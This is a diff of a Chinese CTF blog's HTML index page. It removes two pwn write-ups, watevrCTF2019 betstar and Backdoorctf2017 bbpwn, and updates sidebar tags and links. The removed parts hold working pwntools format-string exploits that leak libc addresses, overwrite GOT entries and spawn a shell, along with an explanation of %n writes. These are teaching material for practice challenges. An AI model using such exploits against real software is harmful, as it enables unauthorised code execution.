class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;amount&#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Name:&#x27;</span>, <span class="string">b&#x27;%1$p%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">play_round(<span class="number">1</span>)		<span class="comment"># 只第一名玩家玩，泄露ELF和libc基地址（由gdb调试分析得来1$p和23$p）</span></span><br><span class="line">ru(<span class="string">b&#x27;*drumroll*: &#x27;</span>)</span><br><span class="line">belf_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;05c&#x27;</span>), <span class="number">16</span>) - <span class="number">0x105c</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>).strip(<span class="string">b&#x27;\n&#x27;</span>), <span class="number">16</span>) - <span class="number">0x10</span> -libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">strtok = libc_base + libc.sym[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">strtok_got = belf_base + belf.got[<span class="string">&#x27;strtok&#x27;</span>]</span><br><span class="line">atoi_got = belf_base + belf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;elf base: &quot;</span> + <span class="built_in">hex</span>(belf_base))</span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;strtok: &quot;</span> + <span class="built_in">hex</span>(strtok))</span><br><span class="line">success(<span class="string">&quot;strtok@got: &quot;</span> + <span class="built_in">hex</span>(strtok_got))</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">byte0 = (system &amp; <span class="number">0xff</span>)</span><br><span class="line">byte1 = ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">byte2 = ((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">word1 = ((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span>)    <span class="comment"># byte 1 and 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # method 1</span></span><br><span class="line"><span class="comment"># change_name(0, p32(strtok_got + 0) + f&#x27;%&#123;get_offset(byte0)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player0: &quot;+ f&#x27;%&#123;get_offset(byte0)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># change_name(2, p32(strtok_got + 1) + f&#x27;%&#123;get_offset(byte1)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player1: &quot;+ f&#x27;%&#123;get_offset(byte1)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># change_name(4, p32(strtok_got + 2) + f&#x27;%&#123;get_offset(byte2)&#125;d%19$hhn&#x27;.encode())</span></span><br><span class="line"><span class="comment"># info(&quot;player2: &quot;+ f&#x27;%&#123;get_offset(byte2)&#125;d%19$hhn&#x27;)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     play_round(6)</span></span><br><span class="line"><span class="comment"># add_player(b&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">fmt = p32(atoi_got) + p32(atoi_got + <span class="number">2</span>)</span><br><span class="line">fmt += <span class="string">f&#x27;%<span class="subst">&#123;(system &amp; <span class="number">0xffff</span>) - <span class="number">8</span>&#125;</span>d%19$hn&#x27;</span>.encode()</span><br><span class="line">fmt += <span class="string">f&#x27;%<span class="subst">&#123;((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>)&#125;</span>d%20$hn&#x27;</span>.encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(fmt))</span><br><span class="line">change_name(<span class="number">0</span>, fmt[<span class="number">0</span>:<span class="number">17</span>])</span><br><span class="line">change_name(<span class="number">1</span>, fmt[<span class="number">16</span>:])</span><br><span class="line">play_round(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;End the game&#x27;</span>, <span class="string">b&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/08/25/watevrctf2019-betstar-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/08/24/Backdoorctf2017-bbpwn-wp/" >nightmare 3.1.Backdoorctf2017 bbpwn-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-08-24
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings/backdoor17_bbpwn">相关资源</a>  </p>
-<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checksec 32_new</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    </span><br><span class="line">$ ./32_new</span><br><span class="line">Hello baby pwner, whats your name?</span><br><span class="line">guyinatuxedo</span><br><span class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye guyinatuxedo</span><br></pre></td></tr></table></figure>
-
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">200</span>]; <span class="comment">// [esp+18h] [ebp-200h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+E0h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+20Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello baby pwner, whats your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">200</span>, edata);</span><br><span class="line">  fflush(edata);</span><br><span class="line">  <span class="built_in">sprintf</span>(format, <span class="string">&quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>11# 获取输入置于<code>format</code>中</li>
-<li>13# 直接输出format（存在格式化字符串漏洞）</li>
-<li>18# 有后门函数flag</li>
-</ol>
-<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>因为栈上地址无法泄露，我们不可获取栈地址从而写返回地址</p>
-<p>但是main最后还调用了库函数<code>fflush</code>，我们可以改写got表中它的真实地址为<code>flag</code>函数的地址，从而获取flag</p>
-<h3 id="n作用"><a href="#n作用" class="headerlink" title="%n作用"></a>%n作用</h3><p>把截至目前成功输出的字符数量以<code>int</code>型数据格式写入到对应地址</p>
-<h3 id="num-x作用"><a href="#num-x作用" class="headerlink" title="%{num}$x作用"></a>%{num}$x作用</h3><p>指定第<code>&#123;num&#125;</code>个参数进行输出&#x2F;写入     那么<code>printf(&quot;hhh%2$n&quot;, a, b)</code>也就是将<code>3</code>写入第二个参数<code>b</code><strong>指向的内存（注意不是改写b本身）</strong></p>
-<h3 id="覆盖方式"><a href="#覆盖方式" class="headerlink" title="覆盖方式"></a>覆盖方式</h3><p>从低字节向高字节覆盖，注意写入的值<strong>只增不减</strong> （因为输出只会多不会少），但我们通常只要保证低字节位为我们想要的值即可，溢出可以继续被覆盖</p>
-<p>例：		假如我们想写入<code>0x0862</code>，但我们目前就已经输出了<code>0x70</code>个字符</p>
-<ol>
-<li><p>法一：首先凑满<code>0x162</code>写入最低地址，再凑够<code>0x208</code>写入地址加一，假设溢出对后面没有太大影响的话就已经写入成功</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|62|01|</span><br><span class="line">|62|08|02|</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>法二：直接凑够<code>0x862</code>个字符写入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|62|08|</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./32_new&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./32_new&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    b * 0x080487D7</span></span><br><span class="line"><span class="string">	c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x0804870B</span></span><br><span class="line">main = <span class="number">0x08048724</span></span><br><span class="line">fflush_got = belf.got[<span class="string">&#x27;fflush&#x27;</span>]</span><br><span class="line">payload = p32(fflush_got)			</span><br><span class="line">payload += p32(fflush_got + <span class="number">1</span>) + p32(fflush_got + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%185d%10$n&#x27;</span>        <span class="comment"># 0x10b-82=185		前面的输出就已经有82了，我们在最低字节处写入0x10b</span></span><br><span class="line">payload += <span class="string">b&#x27;%892d%11$n&#x27;</span>       <span class="comment"># 0x487-0x10b=892	第二字节处写入0x0487</span></span><br><span class="line">payload += <span class="string">b&#x27;%129d%12$n&#x27;</span>        <span class="comment"># 0x508-0x487=129	最后一个字节处写入0x0508</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;name?&#x27;</span>, payload)</span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-
-
-
-
-<hr>
-
-	
-	</div>
-  <a type="button" href="/2023/08/24/Backdoorctf2017-bbpwn-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -689,7 +682,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>20</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -697,7 +690,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>47</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>49</span></a></li>
 		
 		</ul>
 	</div>
@@ -708,48 +701,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
 		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
 		
-			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
+			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/StarCTF2018/">StarCTF2018<span>1</span></a></li>
+			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
 		
-			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
 		
-			<li><a href="/tags/SWPUCTF2022/">SWPUCTF2022<span>3</span></a></li>
+			<li><a href="/tags/index/">index<span>1</span></a></li>
 		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
 		
-			<li><a href="/tags/redis/">redis<span>1</span></a></li>
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/CTF/">CTF<span>83</span></a></li>
+			<li><a href="/tags/fuzz/">fuzz<span>6</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>4</span></a></li>
+			<li><a href="/tags/js/">js<span>1</span></a></li>
 		
-			<li><a href="/tags/decrypt/">decrypt<span>1</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
 		
-			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
 		
 			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
 		
-			<li><a href="/tags/rce/">rce<span>16</span></a></li>
-		
-			<li><a href="/tags/privilege-escalation/">privilege escalation<span>1</span></a></li>
-		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
-		
-			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>2</span></a></li>
-		
-			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>3</span></a></li>
-		
 			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
 		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
+			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
+		
+			<li><a href="/tags/libc/">libc<span>1</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>8</span></a></li>
+		
+			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
+		
+			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>105</span></a></li>
+		   <li><a href="/tags">...<span>111</span></a></li>
 		 
 		</ul>
 	</div>
@@ -762,23 +755,23 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/11/10/swampctf2019-syscaller-wp/" ><i class="fa fa-file-o"></i>swampctf2019-syscaller-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/11/07/Backdoorctf-funsignals-wp/" ><i class="fa fa-file-o"></i>Backdoorctf-funsignals-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/25/HDCTF2023-YamiYami-wp/" ><i class="fa fa-file-o"></i>HDCTF2023-YamiYami-wp</a>
+      </li>
+    
+      <li>
+        <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
+      </li>
+    
+      <li>
         <a href="/2023/10/20/ssti/" ><i class="fa fa-file-o"></i>SSTI模板注入</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/17/GDOUCTF2023-ezze-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-&lt;ez_ze&gt;-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/16/axb2020-NormalSSTI-wp/" ><i class="fa fa-file-o"></i>安洵杯2020 Normal SSTI-wp</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/14/seccon2019-sum-wp/" ><i class="fa fa-file-o"></i>nightmare 7.2.3.seccon2019-...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/10/13/HNCTF2022-easyInclude-wp/" ><i class="fa fa-file-o"></i>HNCTF2022-easy_include-wp</a>
       </li>
     
   </ul>
